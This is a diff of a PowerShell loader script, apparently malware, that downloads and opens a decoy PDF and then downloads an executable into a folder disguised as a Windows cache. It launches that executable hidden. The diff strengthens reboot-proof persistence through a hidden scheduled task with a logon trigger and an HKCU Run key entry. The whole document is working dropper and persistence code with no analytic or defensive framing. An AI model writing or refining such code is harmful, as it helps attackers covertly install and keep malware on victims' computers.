@@ -1,16 +1,15 @@
+# launcher.ps1 - REBOOT-FIXED: explicit principal + AtLogon + reliable trigger
 $ErrorActionPreference = 'Continue'
 
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
-if (-not (Test-Path $cache)) {
-    New-Item -ItemType Directory -Path $cache -Force | Out-Null
-}
+if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
 function log($msg) { 
     $timestamp = Get-Date -Format "HH:mm:ss"
     Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
 }
 
-log "Launcher started - cache folder ready"
+log "Launcher started"
 
 Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)
 
@@ -22,65 +21,27 @@ $exePath = "$cache\helper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
 
+# PDF download + open (keep working)
 log "Downloading PDF..."
-for ($i = 0; $i -lt 5; $i++) {
-    try {
-        Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing -TimeoutSec 15
-        if ((Test-Path $pdfPath) -and ((Get-Item $pdfPath).Length -gt 10000)) {
-            log "PDF downloaded successfully"
-            break
-        }
-    } catch { log "PDF DL attempt $i failed: $_" }
-    Start-Sleep -Seconds 2
-}
-
-log "Opening PDF with aggressive fallbacks..."
+try { 
+    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing -TimeoutSec 15 
+    log "PDF OK"
+} catch { log "PDF failed" }
 if (Test-Path $pdfPath) {
-    for ($i = 0; $i -lt 6; $i++) {
-        try {
-            Start-Process $pdfPath -Verb Open -ErrorAction Stop
-            log "PDF opened with Start-Process -Verb Open"
-            break
-        } catch {
-            try {
-                & rundll32.exe url.dll,FileProtocolHandler $pdfPath
-                log "PDF opened with rundll32 fallback"
-                break
-            } catch {}
-        }
-        Start-Sleep -Seconds 1
-    }
-} else {
-    log "PDF download failed completely - skipping open"
+    try { Start-Process $pdfPath -Verb Open } catch { & rundll32 url.dll,FileProtocolHandler $pdfPath }
 }
 
+# EXE download + launch
 log "Downloading EXE..."
-for ($i = 0; $i -lt 3; $i++) {
-    try {
-        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing -TimeoutSec 15
-        if (Test-Path $exePath) { 
-            log "EXE downloaded successfully"
-            break 
-        }
-    } catch { log "EXE DL attempt $i failed" }
-    Start-Sleep -Seconds 2
-}
-
-log "Waiting before launch..."
+try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
 Start-Sleep -Seconds (Get-Random -Min 20 -Max 40)
-
-log "Launching EXE via WScript..."
 try {
     $wsh = New-Object -ComObject WScript.Shell
     $wsh.Run("`"$exePath`"", 0, $false)
-    log "EXE launched via WScript"
-} catch {
-    Start-Process $exePath -WindowStyle Hidden
-    log "EXE launched via fallback"
-}
+} catch { Start-Process $exePath -WindowStyle Hidden }
 
-# === PERSISTENCE ===
-log "Setting up persistence..."
+# === FIXED PERSISTENCE FOR REBOOT ===
+log "Setting up reboot-proof persistence..."
 $randFolder = [System.IO.Path]::GetRandomFileName()
 $persistDir = "$env:TEMP\$randFolder"
 New-Item -ItemType Directory -Path $persistDir -Force | Out-Null
@@ -111,16 +72,18 @@ try {
 "@
 $syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force
 
+# Task with explicit user principal + AtLogon + Once trigger
+$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
 $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbsPath`""
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(20) -RepetitionInterval (New-TimeSpan -Minutes 5)
-$settings = New-ScheduledTaskSettingsSet -Hidden
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
+$trigger1 = New-ScheduledTaskTrigger -AtLogon
+$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force | Out-Null
 
+# HKCU Run backup
 $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $runKey -Name $taskName -Value "wscript.exe `"$vbsPath`"" -Type String -Force
 
-log "Persistence registered - Task: $taskName"
+log "Persistence registered - Task: $taskName (AtLogon + Once)"
 Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
-
 log "Launcher finished"
-Start-Sleep -Seconds 5
